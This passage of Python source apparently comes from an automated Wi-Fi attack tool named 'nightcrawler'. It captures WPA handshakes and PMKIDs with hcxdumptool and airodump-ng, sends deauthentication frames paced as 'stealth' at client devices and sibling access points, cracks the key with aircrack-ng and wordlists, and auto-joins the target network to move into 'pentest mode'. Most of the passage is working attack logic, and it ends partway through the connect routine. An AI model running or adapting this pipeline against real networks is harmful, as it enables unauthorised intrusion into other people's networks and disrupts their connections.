                _state["capture_file"] = cap_file
                _state["capture_tool"] = "done"
                _push_feed("capture", f"WPA handshake captured! -> {cap_file}")
                try:
                    conn = db._get_conn()
                    conn.execute("INSERT INTO wifi_handshakes (bssid, ssid, capture_file, captured_at) VALUES (?, ?, ?, ?)",
                                 (bssid, ssid, cap_file, _now()))
                    conn.commit()
                except Exception:
                    pass
                _persist_state()
                # Auto-start cracking
                _push_feed("capture", "Handshake captured — auto-starting crack...")
                start_crack()

            _capture_thread = threading.Thread(target=_sim_capture, daemon=True)
            _capture_thread.start()
            return {"ok": True}

        # Real mode — alternating capture loop
        def _capture_loop():
          try:
            ext_iface = _state.get("_ext_iface", EXT_IFACE)
            mon_iface = _state.get("_mon_iface", ext_iface + "mon")
            can_hcxdumptool = _state.get("_adapter_usb_id") == "148f:3572"
            cycle = 0

            while not _capture_stop.is_set() and not _state["handshake_captured"]:
                cycle += 1
                _state["capture_cycle"] = cycle

                # Alternate: odd cycles = hcxdumptool (PMKID), even = airodump+deauth
                # Falls back to airodump-only if adapter doesn't support hcxdumptool
                use_hcx_this_cycle = can_hcxdumptool and (cycle % 2 == 1)

                if use_hcx_this_cycle:
                    # RT3572 — use hcxdumptool for PMKID capture
                    _state["capture_tool"] = "hcxdumptool"
                    _push_feed("capture", f"[Cycle {cycle}] hcxdumptool PMKID capture ({AIRODUMP_DURATION}s)")
                    _file_logger.info("Capture cycle %d: hcxdumptool on %s CH%s for %ds",
                                      cycle, ext_iface, channel, AIRODUMP_DURATION)
                    _persist_state()

                    # Ensure monitor mode on the monitor interface
                    try:
                        subprocess.run(["ip", "link", "set", mon_iface, "up"],
                                       capture_output=True, timeout=5)
                    except Exception:
                        pass

                    # Kill any stale hcxdumptool processes from previous cycles
                    subprocess.run(["pkill", "-9", "-f", "hcxdumptool"],
                                   capture_output=True, timeout=5)
                    time.sleep(1)

                    # Clean old capture files
                    for f in os.listdir("/tmp"):
                        if f.startswith("nc-capture"):
                            try: os.remove(os.path.join("/tmp", f))
                            except Exception: pass

                    pcapng_file = f"{CAPTURE_PREFIX}-{int(time.time())}.pcapng"
                    filterlist = f"/tmp/nc-hcx-filter-{int(time.time())}.txt"
                    try:
                        # Write BSSID filter file for hcxdumptool
                        with open(filterlist, "w") as flt:
                            flt.write(bssid.replace(":", "").lower() + "\n")

                        # hcxdumptool v7: no BPF filter — filter was too restrictive
                        # and blocked hcxdumptool's own TX frames needed for PMKID.
                        # Channel lock ensures we only capture the target's channel.
                        # Post-capture filtering by BSSID done via hcxpcapngtool.
                        # Run for full cycle duration — don't exit on first EAPOL
                        # (--exitoneapol exits on ANY network's handshake, not just ours)
                        hcx_cmd = ["hcxdumptool", "-i", mon_iface,
                                   "-w", pcapng_file,
                                   "-c", f"{channel}a",
                                   f"--tot={AIRODUMP_DURATION // 60}"]

                        # Retry loop — hcxdumptool can die on startup (interface busy, etc)
                        MAX_RETRIES = 3
                        cycle_start = time.time()
                        last_status_push = cycle_start
                        for attempt in range(1, MAX_RETRIES + 1):
                            if _capture_stop.is_set() or _state["handshake_captured"]:
                                break

                            hcx_proc = subprocess.Popen(
                                hcx_cmd,
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                preexec_fn=os.setsid, text=True)
                            _capture_proc = hcx_proc
                            _file_logger.info("hcxdumptool PID %d on CH%s for %s (attempt %d/%d)",
                                              hcx_proc.pid, channel, bssid, attempt, MAX_RETRIES)
                            if attempt > 1:
                                _push_feed("capture", f"hcxdumptool retry {attempt}/{MAX_RETRIES}")

                            # Wait for remaining cycle duration or stop signal
                            remaining = AIRODUMP_DURATION - int(time.time() - cycle_start)
                            if remaining < 30:
                                break  # Not enough time left for meaningful capture

                            start_t = time.time()
                            while time.time() - start_t < remaining:
                                if _capture_stop.is_set():
                                    _file_logger.info("hcxdumptool interrupted: capture_stop after %ds",
                                                      int(time.time() - start_t))
                                    _push_feed("capture", "Capture stopped by user")
                                    break
                                if _state["handshake_captured"]:
                                    _file_logger.info("hcxdumptool: handshake captured after %ds",
                                                      int(time.time() - start_t))
                                    break
                                if hcx_proc.poll() is not None:
                                    elapsed = int(time.time() - start_t)
                                    _file_logger.info("hcxdumptool died: rc=%d after %ds (attempt %d)",
                                                      hcx_proc.returncode, elapsed, attempt)
                                    _push_feed("capture",
                                        f"hcxdumptool exited after {elapsed}s (rc={hcx_proc.returncode})")
                                    break
                                # Periodic status update every 60s
                                now = time.time()
                                if now - last_status_push >= 60:
                                    cycle_elapsed = int(now - cycle_start)
                                    cycle_remaining = AIRODUMP_DURATION - cycle_elapsed
                                    pcap_size = os.path.getsize(pcapng_file) if os.path.exists(pcapng_file) else 0
                                    _push_feed("capture",
                                        f"PMKID scanning... {cycle_elapsed//60}m elapsed, {cycle_remaining//60}m left, {pcap_size//1024}KB")
                                    last_status_push = now
                                _capture_stop.wait(5)

                            # Kill hcxdumptool if still running
                            try:
                                os.killpg(os.getpgid(hcx_proc.pid), signal.SIGTERM)
                                hcx_proc.wait(timeout=5)
                            except Exception:
                                try: hcx_proc.kill()
                                except Exception: pass
                            _capture_proc = None

                            # If it ran for >60s, it was working — don't retry
                            run_time = int(time.time() - start_t)
                            if run_time > 60 or _capture_stop.is_set() or _state["handshake_captured"]:
                                break

                            # Brief pause before retry
                            _push_feed("capture", f"hcxdumptool died after {run_time}s — retrying in 5s...")
                            time.sleep(5)

                        total_elapsed = int(time.time() - cycle_start)
                        _file_logger.info("hcxdumptool cycle ended after %ds (target %ds, %d attempts)",
                                          total_elapsed, AIRODUMP_DURATION, attempt)

                        # Convert pcapng and check for PMKID/handshake for OUR target
                        if os.path.exists(pcapng_file) and os.path.getsize(pcapng_file) > 0:
                            hash_out = f"/tmp/nc-hcx-hashes-{int(time.time())}.22000"
                            hcx_conv = subprocess.run(
                                ["hcxpcapngtool", "--all", "-o", hash_out, pcapng_file],
                                capture_output=True, text=True, timeout=30)
                            _file_logger.info("hcxpcapngtool: rc=%d out=%s",
                                              hcx_conv.returncode, hcx_conv.stdout.strip()[:200])

                            # Filter hashes for our target BSSID only
                            target_bssid_nocolon = bssid.replace(":", "").lower()
                            target_hashes = []
                            if os.path.exists(hash_out):
                                with open(hash_out) as hf:
                                    for line in hf:
                                        # 22000 format: WPA*TYPE*MIC*MAC_AP*MAC_CL*ESSID*...
                                        parts = line.strip().split("*")
                                        if len(parts) >= 4 and target_bssid_nocolon in parts[3]:
                                            target_hashes.append(line.strip())

                            if target_hashes:
                                # Save filtered hashes + pcapng
                                os.makedirs(CAPTURE_DIR, exist_ok=True)
                                import shutil
                                final_hash = os.path.join(CAPTURE_DIR,
                                    f"{ssid.replace(' ', '_')}-{int(time.time())}.22000")
                                final_pcapng = os.path.join(CAPTURE_DIR,
                                    f"{ssid.replace(' ', '_')}-{int(time.time())}.pcapng")
                                with open(final_hash, "w") as fh:
                                    fh.write("\n".join(target_hashes) + "\n")
                                shutil.copy2(pcapng_file, final_pcapng)
                                rel_path = os.path.relpath(final_hash, "/root/nightcrawler")
                                _state["handshake_captured"] = True
                                _state["capture_file"] = rel_path
                                _state["capture_tool"] = "done"
                                _push_feed("capture",
                                    f"PMKID/handshake for {ssid} captured! ({len(target_hashes)} hash(es)) -> {rel_path}")
                                try:
                                    conn = db._get_conn()
                                    conn.execute("INSERT INTO wifi_handshakes (bssid, ssid, capture_file, captured_at) VALUES (?, ?, ?, ?)",
                                                 (bssid, ssid, rel_path, _now()))
                                    conn.commit()
                                except Exception:
                                    pass
                            else:
                                other_count = sum(1 for _ in open(hash_out)) if os.path.exists(hash_out) else 0
                                msg = f"[Cycle {cycle}] No hash for {ssid}"
                                if other_count:
                                    msg += f" ({other_count} other network(s) captured)"
                                _push_feed("capture", msg)
                        else:
                            _push_feed("capture", f"[Cycle {cycle}] hcxdumptool produced no output")

                    except Exception as e:
                        _file_logger.error("hcxdumptool cycle failed: %s", e)
                        import traceback
                        _file_logger.error("traceback: %s", traceback.format_exc())
                        _push_feed("error", f"hcxdumptool error: {e}")
                    finally:
                        # Clean up filter file
                        try: os.remove(filterlist)
                        except Exception: pass

                    if not _state["handshake_captured"]:
                        _push_feed("capture", f"[Cycle {cycle}] No PMKID yet — switching to airodump+deauth next cycle")
                        _capture_stop.wait(10)
                    continue

                # Airodump-ng + deauth cycle (even cycles for RT3572, all cycles for others)
                _state["capture_tool"] = "airodump-ng"
                _push_feed("capture", f"[Cycle {cycle}] airodump-ng + stealth deauth ({AIRODUMP_DURATION}s)")
                _file_logger.info("Capture cycle %d: airodump+deauth on %s CH%s for %ds",
                                  cycle, ext_iface, channel, AIRODUMP_DURATION)
                _persist_state()

                # Ensure monitor mode on external adapter
                subprocess.run(["ip", "link", "set", ext_iface, "down"],
                               capture_output=True, timeout=5)
                subprocess.run(["iw", "dev", ext_iface, "set", "type", "monitor"],
                               capture_output=True, timeout=5)
                subprocess.run(["ip", "link", "set", ext_iface, "up"],
                               capture_output=True, timeout=5)
                time.sleep(1)

                # Clean old capture files
                for f in os.listdir("/tmp"):
                    if f.startswith("nc-capture"):
                        try: os.remove(os.path.join("/tmp", f))
                        except Exception: pass

                # Start airodump-ng focused on target
                try:
                    # Capture on channel only (not BSSID-filtered) to catch
                    # handshakes from sibling APs (WPA3/dual-band same SSID)
                    airo_proc = subprocess.Popen(
                        ["airodump-ng", "-c", str(channel),
                         "-w", CAPTURE_PREFIX, mon_iface],
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        preexec_fn=os.setsid, text=True)
                    _capture_proc = airo_proc
                    _file_logger.info("airodump-ng PID %d on CH%s for %s",
                                      airo_proc.pid, channel, bssid)

                    # Find sibling BSSIDs (same SSID, different BSSID) — dual-band/WPA3 APs
                    sibling_bssids = []
                    try:
                        _ssid = _state.get("target_ssid", "")
                        if _ssid:
                            scan_csv = os.path.join("/tmp", "nc-wifi-scan-01.csv")
                            if os.path.exists(scan_csv):
                                with open(scan_csv) as f:
                                    for line in f:
                                        parts = line.split(",")
                                        if len(parts) >= 14 and parts[-1].strip() == _ssid:
                                            sib = parts[0].strip()
                                            if sib and sib != bssid:
                                                sibling_bssids.append(sib)
                        if sibling_bssids:
                            _push_feed("capture", f"Sibling APs detected: {', '.join(sibling_bssids)} (will deauth both)")
                            _file_logger.info("Sibling BSSIDs for %s: %s", _ssid, sibling_bssids)
                    except Exception:
                        pass

                    # Stealth deauth in background thread
                    def _do_deauths():
                        # Wait 30s for airodump to discover clients before first deauth
                        for _ in range(6):
                            time.sleep(5)
                            if _capture_stop.is_set() or _state["handshake_captured"]:
                                return

                        clients = _get_clients_for_bssid(bssid)
                        # Also get clients from sibling APs
                        for sib in sibling_bssids:
                            for c in _get_clients_for_bssid(sib):
                                if c not in clients:
                                    clients.append(c)

                        if clients:
                            msg = f"Found {len(clients)} client(s)"
                            if sibling_bssids:
                                msg += f" (incl. {len(sibling_bssids)} sibling AP(s): {', '.join(sibling_bssids[:2])})"
                            _push_feed("deauth", msg)
                        else:
                            # No known clients — send targeted broadcast deauths
                            _push_feed("deauth", "No known clients — broadcast deauth to provoke reconnections")
                            for ap in [bssid] + sibling_bssids:
                                for _ in range(2):
                                    if _capture_stop.is_set() or _state["handshake_captured"]:
                                        return
                                    try:
                                        subprocess.run(["aireplay-ng", "-0", "3", "-a", ap, mon_iface],
                                                       capture_output=True, timeout=15)
                                    except Exception:
                                        pass
                                    time.sleep(60)
                            _push_feed("deauth", "Broadcast sweep done — listening for reconnections")
                            return

                        cooldown = 90   # 90s between deauths (semi-stealthy)
                        max_deauths = 5  # 5 per 13.5min cycle
                        frames = 3       # 3 frames per deauth (enough to disconnect)

                        for i in range(max_deauths):
                            if _capture_stop.is_set() or _state["handshake_captured"]:
                                break
                            time.sleep(cooldown)
                            if _capture_stop.is_set() or _state["handshake_captured"]:
                                break

                            # Re-read clients each iteration (new ones may appear)
                            fresh_clients = _get_clients_for_bssid(bssid)
                            for sib in sibling_bssids:
                                for c in _get_clients_for_bssid(sib):
                                    if c not in fresh_clients:
                                        fresh_clients.append(c)
                            if fresh_clients:
                                clients = fresh_clients

                            client = clients[i % len(clients)]
                            # Deauth from the primary target BSSID
                            cmd = ["aireplay-ng", "-0", str(frames), "-a", bssid,
                                   "-c", client, mon_iface]
                            try:
                                subprocess.run(cmd, capture_output=True, timeout=15)
                                _state["deauth_count"] = i + 1
                                _push_feed("deauth", f"Deauth #{i+1}/{max_deauths} -> {client} ({frames}f)")
                                _file_logger.info("Deauth %d/%d -> %s (%d frames)", i+1, max_deauths, client, frames)
                            except Exception:
                                pass

                            # Also deauth sibling BSSIDs (forces WPA3 clients to reconnect)
                            for sib in sibling_bssids:
                                if _capture_stop.is_set() or _state["handshake_captured"]:
                                    break
                                try:
                                    sib_cmd = ["aireplay-ng", "-0", str(frames), "-a", sib,
                                               "-c", client, mon_iface]
                                    subprocess.run(sib_cmd, capture_output=True, timeout=15)
                                    _file_logger.info("Sibling deauth -> %s via %s", client, sib)
                                except Exception:
                                    pass

                            # Every 3rd iteration, broadcast deauth both APs
                            if (i + 1) % 3 == 0 and not _state["handshake_captured"]:
                                for ap in [bssid] + sibling_bssids:
                                    try:
                                        bcast_cmd = ["aireplay-ng", "-0", "3", "-a", ap, mon_iface]
                                        subprocess.run(bcast_cmd, capture_output=True, timeout=15)
                                    except Exception:
                                        pass
                                _push_feed("deauth", f"Broadcast sweep ({1 + len(sibling_bssids)} APs, 3f each)")

                    deauth_t = threading.Thread(target=_do_deauths, daemon=True)
                    deauth_t.start()

                    # Monitor airodump output for handshake
                    start_t = time.time()
                    last_status_t = start_t
                    while (time.time() - start_t) < AIRODUMP_DURATION:
                        if _capture_stop.is_set() or _state["handshake_captured"]:
                            break
                        # Periodic status update every 3 minutes
                        now = time.time()
                        if now - last_status_t >= 180:
                            elapsed = int(now - start_t)
                            remaining = AIRODUMP_DURATION - elapsed
                            cap_size = 0
                            for f in os.listdir("/tmp"):
                                if f.startswith("nc-capture") and f.endswith(".cap"):
                                    cap_size = os.path.getsize(os.path.join("/tmp", f))
                            _push_feed("capture", f"Listening... {elapsed//60}m elapsed, {remaining//60}m left, {cap_size//1024}KB captured")
                            last_status_t = now
                        if airo_proc.poll() is not None:
                            elapsed = int(time.time() - start_t)
                            _file_logger.info("airodump-ng exited after %ds (rc=%d)", elapsed, airo_proc.returncode)
                            _push_feed("capture", f"airodump-ng exited after {elapsed}s")
                            break
                        try:
                            line = airo_proc.stdout.readline()
                            if line and "WPA handshake" in line:
                                _file_logger.info("Handshake detected in airodump: %s", line.strip()[:100])
                                # Check if it's for our target or a sibling AP (same SSID)
                                all_bssids = [bssid.upper()] + [s.upper() for s in sibling_bssids]
                                if any(b in line.upper() for b in all_bssids):
                                    # Find the .cap file
                                    cap_file = None
                                    for f in os.listdir("/tmp"):
                                        if f.startswith("nc-capture") and f.endswith(".cap"):
                                            cap_file = os.path.join("/tmp", f)
                                    if cap_file:
                                        dest = os.path.join(CAPTURE_DIR,
                                            f"{ssid.replace(' ', '_')}-{int(time.time())}.cap")
                                        os.rename(cap_file, dest)
                                        rel_path = os.path.relpath(dest, "/root/nightcrawler")
                                        _state["handshake_captured"] = True
                                        _state["capture_file"] = rel_path
                                        _state["capture_tool"] = "airodump-ng"
                                        _push_feed("capture", f"WPA handshake captured! -> {rel_path}")
                                        _file_logger.info("HANDSHAKE CAPTURED: %s", rel_path)
                                        try:
                                            conn = db._get_conn()
                                            conn.execute("INSERT INTO wifi_handshakes (bssid, ssid, capture_file, captured_at) VALUES (?, ?, ?, ?)",
                                                         (bssid, ssid, rel_path, _now()))
                                            conn.commit()
                                        except Exception:
                                            pass
                                        _persist_state()
                                        break
                                    else:
                                        _push_feed("capture", "Handshake detected but .cap file not found — continuing capture")
                        except Exception:
                            pass
                        time.sleep(0.5)

                    # Cleanup this cycle
                    _kill_proc(airo_proc)
                    if _capture_proc is airo_proc:
                        _capture_proc = None
                    deauth_t.join(timeout=5)

                except Exception as e:
                    _file_logger.error("airodump cycle failed: %s", e)
                    import traceback
                    _file_logger.error("traceback: %s", traceback.format_exc())
                    _push_feed("error", f"airodump error: {e}")

                if not _state["handshake_captured"]:
                    _push_feed("capture", f"[Cycle {cycle}] No handshake yet — restarting in 10s...")
                    # Brief pause between cycles
                    _capture_stop.wait(10)

            # Capture loop ended
            if not _state["handshake_captured"]:
                _state["capture_tool"] = "stopped"
                _push_feed("capture", "Capture stopped — no handshake found")
            else:
                _push_feed("capture", "Handshake captured — auto-starting crack...")
                _file_logger.info("Auto-starting crack after handshake capture")
                start_crack()
            _persist_state()
          except Exception as e:
            _file_logger.error("CAPTURE THREAD CRASHED: %s", e)
            import traceback as _tb
            _file_logger.error("TRACEBACK: %s", _tb.format_exc())
            _push_feed("error", f"Capture thread crashed: {e}")
            _state["capture_tool"] = "crashed"
            _persist_state()

        _capture_thread = threading.Thread(target=_capture_loop, daemon=True)
        _capture_thread.start()
        return {"ok": True}


def _get_clients_for_bssid(bssid):
    """Find connected clients for a BSSID from scan AND capture CSVs."""
    clients = []
    seen = set()
    try:
        for f in sorted(os.listdir("/tmp"), reverse=True):
            # Check both scan CSVs and capture CSVs (same airodump format)
            if (f.startswith("nc-wifi-scan") or f.startswith("nc-capture")) and f.endswith(".csv"):
                try:
                    with open(os.path.join("/tmp", f), "r", errors="ignore") as fh:
                        content = fh.read().replace("\r\n", "\n")
                    sections = content.split("\n\n")
                    if len(sections) > 1:
                        for line in sections[1].strip().split("\n"):
                            parts = [p.strip() for p in line.split(",")]
                            if len(parts) >= 6 and re.match(r'^[0-9A-Fa-f:]{17}$', parts[0]):
                                if parts[5].strip() == bssid and parts[0] not in seen:
                                    clients.append(parts[0])
                                    seen.add(parts[0])
                except Exception:
                    continue
    except Exception:
        pass
    return clients


def _auto_connect():
    """Auto-connect after crack success. If connect fails, retry capture."""
    result = connect()
    if result.get("ok"):
        _push_feed("connect", "Successfully connected — transitioning to online mode")
    else:
        err = result.get("error", "unknown")
        _push_feed("connect", f"Connection failed ({err}) — password may be wrong, retrying capture...")
        _file_logger.warning("Auto-connect failed: %s — restarting capture", err)
        _state["handshake_captured"] = False
        _state["password"] = ""
        _state["crack_progress"] = 0
        start_capture()


def stop_capture():
    """Stop handshake capture."""
    global _capture_proc, _capture_thread
    with _lock:
        _capture_stop.set()
        _kill_proc(_capture_proc)
        _capture_proc = None
        _push_feed("capture", "Capture stopped")
        _state["capture_tool"] = "stopped"
        _persist_state()
        return {"ok": True}


def start_crack(handshake_id=None):
    """Start aircrack-ng cracking on the captured handshake."""
    global _crack_proc
    with _lock:
        if not _state["handshake_captured"] and not handshake_id:
            return {"error": "No handshake captured"}

        _set_stage(3)
        cap_file = _state["capture_file"]
        bssid = _state["target_bssid"]
        ssid = _state["target_ssid"]

        # If specific handshake requested, look it up
        if handshake_id:
            try:
                conn = db._get_conn()
                row = conn.execute(
                    "SELECT bssid, ssid, capture_file FROM wifi_handshakes WHERE id=?",
                    (handshake_id,)).fetchone()
                if row:
                    bssid, ssid, cap_file = row[0], row[1], row[2]
            except Exception:
                pass

        _push_feed("crack", f"Starting crack on {ssid} ({bssid})")

        if SIMULATE:
            def _sim_crack():
                total = 14344392  # rockyou.txt size
                _state["crack_total"] = total
                _state["crack_wordlist"] = "rockyou.txt"
                _state["crack_speed"] = "310.2 k/s"

                for pct in range(0, 101, 5):
                    time.sleep(0.5)
                    _state["crack_progress"] = pct
                    _state["crack_candidates"] = int(total * pct / 100)
                    remaining = total - _state["crack_candidates"]
                    eta_sec = remaining / 310000 if pct < 100 else 0
                    _state["crack_eta"] = f"{int(eta_sec)}s" if eta_sec > 0 else ""
                    _persist_state()
                    if pct % 25 == 0:
                        _push_feed("crack", f"Progress: {pct}% ({_state['crack_candidates']:,}/{total:,})")

                # Simulated success
                _state["password"] = "password123"
                _state["crack_progress"] = 100
                _push_feed("crack", f"KEY FOUND! [ password123 ]")
                try:
                    conn = db._get_conn()
                    conn.execute(
                        "UPDATE wifi_handshakes SET cracked=1, password=? WHERE bssid=?",
                        ("password123", bssid))
                    conn.commit()
                except Exception:
                    pass
                _persist_state()
                # Auto-connect
                _push_feed("crack", "Password found — auto-connecting...")
                _auto_connect()

            threading.Thread(target=_sim_crack, daemon=True).start()
            return {"ok": True}

        # Real mode: aircrack-ng
        try:
            full_cap = os.path.join("/root/nightcrawler", cap_file)
            _file_logger.info("Crack: cap_file=%s full_cap=%s exists=%s",
                              cap_file, full_cap, os.path.exists(full_cap))
            if not os.path.exists(full_cap):
                return {"error": f"Capture file not found: {cap_file}"}

            # Build wordlist: concatenate all available wordlists
            available_wl = [wl for wl in WORDLISTS if os.path.exists(wl)]
            if not available_wl:
                return {"error": "No wordlist found"}

            # aircrack-ng accepts comma-separated wordlists
            wordlist_str = ",".join(available_wl)
            wl_names = "+".join(os.path.basename(w) for w in available_wl)
            total_lines = sum(1 for wl in available_wl
                              for _ in open(wl, errors="ignore"))
            _state["crack_wordlist"] = wl_names
            _push_feed("crack", f"Using wordlist: {wl_names} ({total_lines:,} passwords)")

            # Convert .22000 hash to pcap for aircrack-ng (can't read pcapng/22000)
            crack_file = full_cap
            if full_cap.endswith(".22000"):
                converted_pcap = full_cap.replace(".22000", "-crack.pcap")
                try:
                    conv = subprocess.run(
                        ["hcxhash2cap", f"--pmkid-eapol={full_cap}", "-c", converted_pcap],
                        capture_output=True, text=True, timeout=10)
                    if os.path.exists(converted_pcap) and os.path.getsize(converted_pcap) > 0:
                        crack_file = converted_pcap
                        _file_logger.info("Converted %s -> %s for aircrack", full_cap, converted_pcap)
                    else:
                        _push_feed("crack", "Hash conversion failed — cannot crack")
                        return {"error": "hcxhash2cap conversion failed"}
                except Exception as e:
                    _push_feed("crack", f"Hash conversion error: {e}")
                    return {"error": str(e)}

            crack_cmd = ["aircrack-ng", "-w", wordlist_str, "-b", bssid, crack_file]
            _file_logger.info("Crack CMD: %s", " ".join(crack_cmd))
            _file_logger.info("Crack file: %s exists=%s size=%d",
                              crack_file, os.path.exists(crack_file),
                              os.path.getsize(crack_file) if os.path.exists(crack_file) else 0)
            _crack_proc = subprocess.Popen(
                crack_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )

            def _monitor_crack():
                _line_count = 0
                for line in iter(_crack_proc.stdout.readline, ""):
                    _line_count += 1
                    if _line_count <= 5:
                        _file_logger.info("aircrack line %d: %s", _line_count, repr(line.strip()[:100]))
                    # Parse progress: "12345/14344392 keys tested"
                    m = re.search(r'(\d+)/(\d+)\s+keys\s+tested', line)
                    if m:
                        tested = int(m.group(1))
                        total = int(m.group(2))
                        _state["crack_candidates"] = tested
                        _state["crack_total"] = total
                        _state["crack_progress"] = round(tested / total * 100, 1) if total else 0
                        _persist_state()

                    # Parse speed
                    m2 = re.search(r'(\d+\.?\d*)\s*k/s', line)
                    if m2:
                        _state["crack_speed"] = f"{m2.group(1)} k/s"

                    # Check for success
                    m3 = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', line)
                    if m3:
                        pwd = m3.group(1)
                        _state["password"] = pwd
                        _state["crack_progress"] = 100
                        _push_feed("crack", f"KEY FOUND! [ {pwd} ]")
                        try:
                            conn = db._get_conn()
                            conn.execute(
                                "UPDATE wifi_handshakes SET cracked=1, password=? WHERE bssid=?",
                                (pwd, bssid))
                            conn.commit()
                        except Exception:
                            pass
                        _persist_state()
                        # Auto-connect
                        _push_feed("crack", "Password found — auto-connecting...")
                        _auto_connect()
                        return

                # If we get here, crack failed with all wordlists
                if not _state["password"]:
                    _push_feed("crack", f"All wordlists exhausted ({wl_names}) — no key found")
                    _push_feed("crack", "Returning to capture for additional handshakes/PMKIDs")
                    _file_logger.info("Crack failed — restarting capture pipeline")
                    # Retry: go back to capture
                    _state["handshake_captured"] = False
                    _state["crack_progress"] = 0
                    start_capture()
                    _state["crack_progress"] = 100
                    _state["crack_eta"] = ""
                    _persist_state()

            threading.Thread(target=_monitor_crack, daemon=True).start()
            return {"ok": True}

        except Exception as e:
            _state["error"] = str(e)
            _push_feed("error", f"Crack failed: {e}")
            return {"error": str(e)}


def stop_crack():
    """Stop aircrack-ng cracking."""
    global _crack_proc
    with _lock:
        _kill_proc(_crack_proc)
        _crack_proc = None
        _push_feed("crack", "Cracking stopped")
        _persist_state()
        return {"ok": True}


def get_handshakes():
    """Return all captured handshakes."""
    try:
        conn = db._get_conn()
        rows = conn.execute(
            "SELECT id, bssid, ssid, capture_file, captured_at, cracked, password "
            "FROM wifi_handshakes ORDER BY captured_at DESC"
        ).fetchall()
        return [
            {"id": r[0], "bssid": r[1], "ssid": r[2], "capture_file": r[3],
             "captured_at": r[4], "cracked": bool(r[5]), "password": r[6] if r[5] else ""}
            for r in rows
        ]
    except Exception:
        return []


def get_handshake(handshake_id):
    """Return a single handshake by ID."""
    try:
        conn = db._get_conn()
        row = conn.execute(
            "SELECT id, bssid, ssid, capture_file, captured_at, cracked, password "
            "FROM wifi_handshakes WHERE id=?", (handshake_id,)).fetchone()
        if row:
            return {"id": row[0], "bssid": row[1], "ssid": row[2], "capture_file": row[3],
                    "captured_at": row[4], "cracked": bool(row[5]), "password": row[6] if row[5] else ""}
    except Exception:
        pass
    return None


def delete_handshake(handshake_id):
    """Delete a single handshake record and its capture files from disk."""
    try:
        conn = db._get_conn()
        row = conn.execute(
            "SELECT capture_file, bssid FROM wifi_handshakes WHERE id=?",
            (handshake_id,)).fetchone()
        if not row:
            return {"error": "Handshake not found"}
        cap_file = row[0]
        # Delete capture files from disk
        if cap_file:
            base = os.path.join(os.path.dirname(os.path.dirname(__file__)), cap_file)
            for path in [base, base.replace(".pcapng", ".22000"), base.replace(".22000", ".pcapng")]:
                if os.path.exists(path):
                    try:
                        os.remove(path)
                        _file_logger.info("Deleted capture file: %s", path)
                    except Exception:
                        pass
        conn.execute("DELETE FROM wifi_handshakes WHERE id=?", (handshake_id,))
        conn.commit()
        _push_feed("system", f"Deleted handshake #{handshake_id}")
        return {"ok": True}
    except Exception as e:
        return {"error": str(e)}


def delete_handshakes_by_bssid(bssid):
    """Delete all handshakes for a specific BSSID and their capture files."""
    try:
        conn = db._get_conn()
        rows = conn.execute(
            "SELECT id, capture_file FROM wifi_handshakes WHERE bssid=?",
            (bssid,)).fetchall()
        if not rows:
            return {"error": "No handshakes found for this BSSID"}
        for row in rows:
            cap_file = row[1]
            if cap_file:
                base = os.path.join(os.path.dirname(os.path.dirname(__file__)), cap_file)
                for path in [base, base.replace(".pcapng", ".22000"), base.replace(".22000", ".pcapng")]:
                    if os.path.exists(path):
                        try:
                            os.remove(path)
                        except Exception:
                            pass
        conn.execute("DELETE FROM wifi_handshakes WHERE bssid=?", (bssid,))
        conn.commit()
        _push_feed("system", f"Deleted {len(rows)} handshake(s) for {bssid}")
        return {"ok": True, "deleted": len(rows)}
    except Exception as e:
        return {"error": str(e)}


def connect():
    """Stop monitor mode and connect to the cracked network."""
    with _lock:
        if not _state["password"]:
            return {"error": "No password available"}

        ssid = _state["target_ssid"]
        password = _state["password"]
        _set_stage(4)
        _push_feed("connect", f"Connecting to {ssid}...")

        if SIMULATE:
            time.sleep(1)
            _push_feed("connect", "Monitor mode stopped")
            time.sleep(1)
            _push_feed("connect", f"wpa_supplicant connecting to {ssid}...")
            time.sleep(2)
            _push_feed("connect", "DHCP lease obtained: 192.168.0.184")
            time.sleep(1)
            _push_feed("connect", "Gateway ping OK — connected!")
            _set_stage(5)
            _push_feed("connect", "ONLINE — transitioning to pentest mode")
            return {"ok": True, "ip": "192.168.0.184"}

        # Real mode — connect via Android shell (NOT chroot wpa_supplicant)
        # CRITICAL: Killing Android's wpa_supplicant from chroot breaks WiFi until reboot.
        # Instead, use SSH to Android to add/enable the network via wpa_cli or cmd wifi.
        try:
            # Stop monitor mode on external adapter
            mon_iface = _state.get("_mon_iface", "")
            ext_iface = _state.get("_ext_iface", EXT_IFACE)
            if mon_iface:
                _file_logger.info("Stopping monitor on %s (ext: %s)", mon_iface, ext_iface)
                r1 = subprocess.run(["airmon-ng", "stop", mon_iface],
                                    capture_output=True, text=True, timeout=10)
                _file_logger.info("airmon-ng stop %s: rc=%d", mon_iface, r1.returncode)
                for cmd in [
                    ["ip", "link", "set", ext_iface, "down"],
                    ["iw", "dev", ext_iface, "set", "type", "managed"],
                    ["ip", "link", "set", ext_iface, "up"],
                ]:
                    subprocess.run(cmd, capture_output=True, timeout=5)
            _push_feed("connect", "External adapter monitor mode stopped")

            # Connect via Android shell using cmd wifi
            # This uses Android's WiFi framework instead of killing wpa_supplicant
            _file_logger.info("Connecting via Android shell: cmd wifi connect-network %s wpa2 ***", ssid)
            _push_feed("connect", f"Connecting to {ssid} via Android WiFi manager...")

            ssh_cmd = [
                "ssh", "-p", "9022", "-o", "ConnectTimeout=5",
                "-o", "StrictHostKeyChecking=no",
                "shell@127.0.0.1",
                f"cmd wifi connect-network '{ssid}' wpa2 '{password}'"
            ]
            r = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=15)
            _file_logger.info("cmd wifi connect-network: rc=%d stdout=%s stderr=%s",
                              r.returncode, r.stdout.strip()[:200], r.stderr.strip()[:200])

            if r.returncode != 0:
                # Fallback: try wpa_cli via Android shell
                _push_feed("connect", "cmd wifi failed — trying wpa_cli fallback...")
                _file_logger.info("Fallback: wpa_cli via SSH")
                wpa_cmds = (
                    f"wpa_cli -i wlan0 add_network && "
                    f"wpa_cli -i wlan0 set_network 0 ssid '\"'{ssid}'\"' && "
                    f"wpa_cli -i wlan0 set_network 0 psk '\"'{password}'\"' && "
                    f"wpa_cli -i wlan0 enable_network 0 && "
                    f"wpa_cli -i wlan0 save_config"
                )
                r2 = subprocess.run(
                    ["ssh", "-p", "9022", "-o", "ConnectTimeout=5",
